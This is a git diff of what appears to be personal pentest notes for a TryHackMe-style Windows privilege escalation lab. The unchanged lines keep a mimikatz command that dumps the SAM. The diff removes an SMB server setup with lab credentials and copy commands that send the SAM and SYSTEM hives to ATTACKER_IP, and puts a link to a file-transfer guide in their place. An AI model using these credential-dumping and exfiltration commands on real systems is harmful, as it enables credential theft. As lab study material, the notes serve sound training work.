@@ -806,18 +806,9 @@ mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
 ```
 
 Send them to Kali.
-On Kali:
 
 ```
-mkdir share
-smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
-```
-
-On Windows:
-
-```
-copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
-copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+https://github.com/can-ozkan/PenetrationTesting/blob/main/FileTransfer.md#7-smb-file-transfer-with-smbserverpy
 ```
 
 Then, use secretsdump
